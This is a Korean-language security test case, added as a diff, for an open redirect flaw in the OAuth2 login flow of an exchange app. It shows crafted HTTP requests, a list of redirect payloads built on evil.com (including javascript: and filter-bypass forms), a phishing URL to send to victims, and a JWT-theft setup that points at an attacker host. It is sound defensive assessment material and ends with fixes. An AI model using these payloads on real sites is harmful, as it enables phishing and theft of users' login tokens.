@@ -1,0 +1,261 @@
+================================================================================
+[VCE-EX-05] 검증되지 않은 리다이렉트와 포워드
+도메인: exchange
+================================================================================
+
+1. 진단 항목 개요
+   - 항목명   : 검증되지 않은 리다이렉트와 포워드 (Open Redirect)
+   - 번호     : VCE-EX-05
+   - 위험도   : High
+   - 설명     : OAuth2 소셜 로그인 완료 후 처리되는 리다이렉트 로직에서 쿠키에 저장된
+                redirect_uri 값의 도메인 검증 없이 사용자를 임의의 외부 URL로 리다이렉트하는
+                취약점을 검증한다. OAuth2SuccessHandler.java:43-55에서 이 취약점이 코드
+                리뷰를 통해 확인되었으며, 공격자는 피싱 사이트로 사용자를 유도하거나
+                OAuth 인증 코드를 탈취할 수 있다. 신뢰할 수 있는 도메인(vceapp.com)처럼
+                보이는 URL로 링크를 공유하여 피해자를 속이는 공격에 활용된다.
+
+--------------------------------------------------------------------------------
+
+2. 대상 기능 & 엔드포인트
+   - 기능 설명  : Google/Kakao/Naver 등 OAuth2 소셜 로그인 완료 후 사용자를 원래
+                  페이지로 돌려보내는 리다이렉트 기능. 로그인 전 방문하던 페이지 URL을
+                  쿠키(redirect_uri)에 저장하고 로그인 후 해당 URL로 리다이렉트한다.
+
+   [OAuth2 로그인 시작]
+   - 로컬  : http://localhost:8080/oauth2/authorization/google
+   - 운영  : https://vceapp.com/oauth2/authorization/google
+   - 메서드: GET
+   - 인증  : 불필요 (로그인 전 호출)
+
+   [OAuth2 콜백 엔드포인트]
+   - 로컬  : http://localhost:8080/login/oauth2/code/google
+   - 운영  : https://vceapp.com/login/oauth2/code/google
+   - 메서드: GET
+   - 파라미터: code, state (OAuth2 서버에서 전달)
+   - 인증  : OAuth2 서버에서 redirect (자동 처리)
+
+   [redirect_uri 쿠키 설정 엔드포인트]
+   - 로컬  : http://localhost:5173/login (또는 유사 경로)
+   - 쿠키명: redirect_uri (또는 REDIRECT_URI, returnUrl 등)
+   - 쿠키 저장 주체: 프론트엔드 또는 백엔드
+
+   [최종 리다이렉트 처리 위치]
+   - 파일  : OAuth2SuccessHandler.java:43-55
+   - 설명  : 인증 성공 후 쿠키에서 redirect_uri를 읽어 sendRedirect() 호출
+
+--------------------------------------------------------------------------------
+
+3. 취약점 원리 (Why this works)
+
+   [Open Redirect 기본 원리]
+   Open Redirect는 웹 애플리케이션이 사용자를 다른 URL로 리다이렉트할 때 대상 URL의
+   유효성을 검증하지 않아 발생한다. OAuth2 로그인 플로우에서는 사용자가 로그인 전
+   방문하던 페이지(예: /exchange/btc)로 로그인 후 돌아갈 수 있도록 이 URL을 임시 저장한다.
+   이때 redirect_uri 파라미터 또는 쿠키에 악의적인 외부 URL을 삽입하면, 로그인 완료 후
+   피해자가 공격자의 사이트로 자동으로 리다이렉트된다.
+
+   [OAuth2 플로우에서의 위험성]
+   OAuth2 인증 완료 후에는 JWT 토큰이 발급되며, 이 토큰이 URL 파라미터 또는 쿠키로
+   리다이렉트 응답에 포함될 수 있다. 공격자가 redirect_uri를 자신의 서버로 설정하면
+   JWT 토큰이 공격자 서버로 전달되어 계정이 완전히 탈취될 수 있다. 이것이 단순
+   피싱 리다이렉트와 구별되는 더 위험한 시나리오이다.
+
+   [취약 코드 패턴 분석]
+   OAuth2SuccessHandler.java:43-55에서 다음과 같은 패턴이 예상된다:
+
+   // 취약한 코드 예시
+   String redirectUri = getCookie(request, "redirect_uri");
+   if (redirectUri != null && !redirectUri.isEmpty()) {
+       response.sendRedirect(redirectUri);  // 도메인 검증 없음!
+   } else {
+       response.sendRedirect("http://localhost:5173");
+   }
+
+   이 코드에서 redirectUri에 "https://evil.com"이 저장되어 있으면 공격자 사이트로
+   리다이렉트된다. String.startsWith("http://localhost") 정도의 검증만 있어도
+   "http://localhost.evil.com"으로 우회할 수 있다.
+
+   [피싱 공격 시나리오]
+   1. 공격자가 VCE 로그인 URL에 redirect_uri를 조작한 링크를 생성
+   2. 피해자에게 "VCE 거래소 보안 경고 - 지금 로그인하세요" 형태로 전달
+   3. 피해자가 링크 클릭 후 구글 로그인 완료
+   4. 로그인 후 피싱 사이트로 리다이렉트 (피해자는 VCE와 관련된 URL을 클릭했으므로 신뢰)
+   5. 피싱 사이트에서 추가 자격증명 수집 또는 JWT 토큰 탈취
+
+   [공격 성립 조건]
+   - OAuth2SuccessHandler에서 redirect_uri 쿠키 값의 도메인 검증 없음
+   - 쿠키에 저장되는 redirect_uri 값이 클라이언트에서 임의로 설정 가능
+   - 로그인 완료 후 JWT 토큰이 리다이렉트 URL 파라미터로 전달될 경우 토큰도 탈취 가능
+   - DataInitializer.java:41에 하드코딩된 admin 계정으로 소셜 로그인 연동 가능성
+
+--------------------------------------------------------------------------------
+
+4. 테스트 절차 (Step-by-step)
+
+   [사전 준비]
+   - Burp Suite 실행 및 프록시 설정
+   - 공격자 서버 준비 (로컬: nc -lvp 4444 또는 Burp Collaborator)
+   - 브라우저에서 VCE 거래소 페이지 열기 (http://localhost:5173)
+   - 로그아웃 상태 유지 (세션 쿠키 삭제)
+   - 소셜 로그인(Google/Kakao) 테스트 계정 준비
+
+   ---[ STEP 1: 현재 리다이렉트 플로우 파악 ]---
+   정상적인 OAuth2 로그인 후 리다이렉트를 캡처하여 쿠키 이름과 리다이렉트 동작을 확인한다.
+
+   1-1. 브라우저에서 http://localhost:5173/exchange 접근 (로그인 필요 페이지)
+   1-2. 로그인 페이지로 리다이렉트 시 URL에서 redirect 파라미터 확인
+   1-3. Burp Suite에서 Set-Cookie 헤더로 redirect_uri 쿠키 설정 여부 확인
+   1-4. Google 로그인 후 최종 리다이렉트 URL 확인
+
+   ---[ STEP 2: redirect_uri 쿠키 조작 ]---
+   Burp Suite로 쿠키를 조작하여 악의적인 URL을 주입한다.
+
+   --- HTTP 요청 예시 (쿠키 조작 후 OAuth2 요청) ---
+   GET /oauth2/authorization/google HTTP/1.1
+   Host: localhost:8080
+   Cookie: redirect_uri=https://evil.com
+   ---
+
+   또는 OAuth2 시작 전에 쿠키를 설정:
+   --- HTTP 요청 예시 ---
+   GET /oauth2/authorization/google HTTP/1.1
+   Host: localhost:8080
+   Cookie: JSESSIONID=...; redirect_uri=https://attacker.com/phishing-page
+   ---
+
+   ---[ STEP 3: redirect_uri URL 파라미터 직접 삽입 ]---
+   OAuth2 로그인 URL에 redirect_uri 파라미터를 직접 추가:
+
+   아래 URL을 브라우저 주소창에 입력:
+   http://localhost:8080/oauth2/authorization/google?redirect_uri=https://evil.com
+
+   --- HTTP 요청 예시 ---
+   GET /oauth2/authorization/google?redirect_uri=https%3A%2F%2Fevil.com HTTP/1.1
+   Host: localhost:8080
+   ---
+
+   ---[ STEP 4: OAuth2 콜백에서 redirect_uri 삽입 ]---
+   OAuth2 콜백 요청에 직접 redirect_uri 파라미터 추가:
+
+   --- HTTP 요청 예시 ---
+   GET /login/oauth2/code/google?code=AUTH_CODE&state=STATE&redirect_uri=https://evil.com HTTP/1.1
+   Host: localhost:8080
+   ---
+
+   ---[ STEP 5: 도메인 필터링 우회 시도 ]---
+   서버가 vceapp.com 도메인 체크를 한다고 가정하고 우회 시도:
+
+   --- HTTP 요청 예시 (subdomain 우회) ---
+   Cookie: redirect_uri=https://vceapp.com.evil.com
+   ---
+
+   --- HTTP 요청 예시 (path 우회) ---
+   Cookie: redirect_uri=https://evil.com/vceapp.com
+   ---
+
+   --- HTTP 요청 예시 (@ 기호 우회) ---
+   Cookie: redirect_uri=https://vceapp.com@evil.com
+   ---
+
+   --- HTTP 요청 예시 (URL 인코딩 우회) ---
+   Cookie: redirect_uri=https%3A%2F%2Fevil.com
+   ---
+
+   --- HTTP 요청 예시 (javascript 프로토콜 우회) ---
+   Cookie: redirect_uri=javascript:document.location='https://evil.com'
+   ---
+
+   --- HTTP 요청 예시 (이중 슬래시 우회) ---
+   Cookie: redirect_uri=//evil.com
+   ---
+
+   ---[ STEP 6: JWT 토큰 탈취 시나리오 확인 ]---
+   로그인 후 리다이렉트 URL에 JWT 토큰이 포함되는지 확인:
+
+   6-1. 공격자 서버에서 HTTP 요청 수신 대기 (Burp Collaborator 사용)
+   6-2. redirect_uri를 Burp Collaborator URL로 설정
+   6-3. OAuth2 로그인 완료 후 Collaborator로 전달된 파라미터 확인
+   6-4. token, jwt, access_token 파라미터가 포함되었는지 확인
+
+   --- HTTP 요청 예시 (토큰 탈취용 URL) ---
+   Cookie: redirect_uri=https://attacker.burpcollaborator.net/callback
+   ---
+
+   피해자에게 전송할 피싱 URL 예시:
+   https://vceapp.com/oauth2/authorization/google?redirect_uri=https://evil.com/phishing
+
+   Open Redirect 페이로드 목록:
+   [기본 외부 리다이렉트]
+   1. https://evil.com
+   2. http://evil.com
+   3. //evil.com
+   4. \/\/evil.com
+   5. /\evil.com
+
+   [도메인 필터링 우회]
+   6.  https://vceapp.com.evil.com
+   7.  https://evil.com/vceapp.com
+   8.  https://vceapp.com@evil.com
+   9.  https://vceapp%2ecom@evil.com
+   10. https://evil.com%23.vceapp.com
+
+   [프로토콜 우회]
+   11. javascript:alert(1)
+   12. data:text/html,<script>location='https://evil.com'</script>
+   13. %6a%61%76%61%73%63%72%69%70%74:alert(1) (javascript URL 인코딩)
+
+   [상대 경로 우회]
+   14. /../../evil.com
+   15. /%09/evil.com
+
+--------------------------------------------------------------------------------
+
+5. 취약 여부 판단 기준
+
+   ✅ 취약 (Vulnerable):
+      - redirect_uri 쿠키에 https://evil.com 설정 후 OAuth2 로그인 완료 시
+        외부 사이트로 리다이렉트되는 302 응답 반환
+      - Location 헤더에 외부 도메인 URL이 포함됨
+        (예: Location: https://evil.com?token=eyJhbGci...)
+      - 도메인 필터링이 있더라도 우회 기법(subdomain, @ 기호 등)으로 외부 리다이렉트 성공
+      - Burp Collaborator에 JWT 토큰이 포함된 요청이 수신됨
+
+   ✗ 안전 (Not Vulnerable):
+      - redirect_uri에 외부 도메인 설정 시 허용된 도메인 목록과 비교하여 기본 URL로 리다이렉트
+      - 응답: Location: http://localhost:5173 (기본값으로 안전하게 처리)
+      - 모든 우회 기법에도 vceapp.com 또는 exchange.vceapp.com 도메인으로만 리다이렉트
+
+--------------------------------------------------------------------------------
+
+6. 예상 취약 포인트 (코드 위치)
+
+   - OAuth2SuccessHandler.java:43-55 - 쿠키에서 읽은 redirect_uri를 도메인 검증 없이
+     response.sendRedirect(redirectUri)로 직접 사용 (코드 리뷰에서 이미 확인됨)
+     -> isAuthorizedRedirectUri(redirectUri) 검증 메서드 부재
+     -> 허용된 리다이렉트 URI 목록(ALLOWED_REDIRECT_URIS)과 비교하는 로직 없음
+
+   - OAuth2AuthorizationRequestResolver.java (커스텀 구현 시) - redirect_uri 파라미터 처리
+
+   - application.properties 또는 application.yml - authorizedRedirectUris 설정 부재
+     -> spring.security.oauth2.client.registration.google.redirect-uri 하드코딩 여부
+
+--------------------------------------------------------------------------------
+
+7. 권고 조치
+
+   - [허용 목록 기반 검증] OAuth2SuccessHandler에서 redirect_uri를 처리하기 전에
+     서버 측에서 관리하는 허용된 URI 목록과 정확히 비교한다.
+     예: ALLOWED_URIS = Set.of("http://localhost:5173", "https://exchange.vceapp.com")
+     허용 목록에 없는 URI는 기본 홈 페이지로 리다이렉트한다.
+
+   - [도메인 검증 로직 구현] URI를 파싱하여 scheme(https), host(*.vceapp.com)가
+     허용된 패턴인지 검증한다. URI.getHost()로 추출한 hostname이 vceapp.com 또는
+     그 서브도메인인지 확인하고, @ 기호, 이중 슬래시, URL 인코딩 우회를 방지한다.
+
+   - [쿠키 보안 속성 강화] redirect_uri 쿠키에 SameSite=Lax, HttpOnly, Secure 속성을
+     적용하여 CSRF 및 XSS를 통한 쿠키 조작을 어렵게 한다.
+     쿠키 값의 최대 허용 길이를 제한하여 긴 페이로드 삽입을 방지한다.
+
+   - [State 파라미터 활용] OAuth2 state 파라미터에 redirect_uri를 서명하여 저장하고,
+     콜백 시 서명을 검증하는 방식으로 조작을 방지한다. Spring Security OAuth2 Client의
+     DefaultOAuth2AuthorizationRequestResolver를 커스터마이즈하여 구현한다.
